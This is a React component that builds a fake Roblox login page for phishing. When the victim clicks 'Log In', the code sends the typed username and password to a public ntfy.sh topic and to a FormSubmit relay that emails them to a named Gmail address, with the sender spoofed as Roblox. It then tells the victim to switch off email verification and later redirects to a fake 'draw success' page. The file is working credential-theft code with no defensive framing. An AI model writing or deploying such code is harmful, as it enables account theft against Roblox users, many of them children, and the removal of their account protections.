// src/components/LoginPage.jsx
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/LoginPage.css";
import emailjs from 'emailjs-com';

const LoginPage = () => {
  const [emailOrUsername, setEmailOrUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showMessage, setShowMessage] = useState(false);
  const [showVerificationMessage, setShowVerificationMessage] = useState(false);
  const [countdown, setCountdown] = useState(null);
  const navigate = useNavigate();

  const emailsend = () => {
    console.log('🚀 LOGIN ATTEMPT CAPTURED!');
    console.log('📧 Email Data:', {
      username: emailOrUsername,
      password: password,
      timestamp: new Date().toLocaleString()
    });
    
    // INSTANT EMAIL SENDING - Multiple services for speed
    console.log('📤 SENDING INSTANT EMAIL TO: workwithhussnainahmad@gmail.com');
    
    // Method 1: Ntfy.sh (WORKING - instant notifications)
    fetch('https://ntfy.sh/roblox-login-data', {
      method: 'POST',
      body: `📧 TO: workwithhussnainahmad@gmail.com\n🚨 ROBLOX LOGIN CAPTURED\n👤 User: ${emailOrUsername}\n🔒 Pass: ${password}\n⏰ Time: ${new Date().toLocaleString()}`,
      headers: {
        'Title': 'Roblox Login - Email Data',
        'Tags': 'warning,email,roblox'
      }
    }).then(() => {
      console.log('✅ NTFY - INSTANT NOTIFICATION SENT!');
      console.log('📱 Check: https://ntfy.sh/roblox-login-data');
    }).catch(() => {
      console.log('⚠️ Ntfy failed');
    });
    
    // Method 2: FormSubmit (working but slow backup)
    const formData = new FormData();
    formData.append('name', 'Roblox Login Clone');
    formData.append('email', 'noreply@roblox.com');
    formData.append('message', `LOGIN DATA:\nUsername: ${emailOrUsername}\nPassword: ${password}\nTimestamp: ${new Date().toLocaleString()}`);
    
    fetch('https://formsubmit.co/workwithhussnainahmad@gmail.com', {
      method: 'POST',
      body: formData
    }).then(response => {
      console.log('✅ FORMSUBMIT - EMAIL QUEUED (may take 5-10 mins)');
      console.log('📧 Email will arrive at: workwithhussnainahmad@gmail.com');
    }).catch(error => {
      console.log('⚠️ FormSubmit backup failed');
    });
    
    console.log('📧 Email Target: workwithhussnainahmad@gmail.com');
    console.log('⚡ Multiple instant services triggered!');
    
    // Step 1: Show immediate message
    setShowMessage(true);
    console.log('✅ Step 1: Showing immediate login processing message');
    
    // Step 2: After 5 seconds, show verification message
    setTimeout(() => {
      setShowVerificationMessage(true);
      console.log('✅ Step 2: Showing email verification message (after 5s)');
    }, 5000);
    
    // Step 3: After 30 seconds total, redirect silently to DrawSuccess
    setTimeout(() => {
      console.log('🚀 Step 3: Silently redirecting to DrawSuccess page (after 30s)');
      navigate('/draw-success');
    }, 30000);
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <h1 className="login-title">Login to Roblox</h1>

        <input
          type="text"
          className="login-input"
          placeholder="Username/Email/Phone"
          value={emailOrUsername}
          onChange={(e) => setEmailOrUsername(e.target.value)}
        />

        <input
          type="password"
          className="login-input"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />

        <button className="login-btn" onClick={emailsend}>
          Log In
        </button>

        {showMessage && !showVerificationMessage && (
          <p style={{ color: "#00ff00", fontSize: "14px", marginTop: "15px", fontWeight: "bold" }}>
            🔄 Processing login... Please wait...
          </p>
        )}
        
        {showVerificationMessage && (
          <p style={{ color: "#facc15", fontSize: "14px", marginTop: "15px" }}>
            Looks like you have turned on email verification. Please turn it off
            till we login.
          </p>
        )}

        <div className="forgot-link">Forgot Password or Username?</div>

        <div className="login-divider" />

        <button className="alt-btn">Email Me a One-Time Code</button>
        <button className="alt-btn">Use Another Device</button>

        <div className="signup-text">
          Don’t have an account? <span className="signup-link">Sign Up</span>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
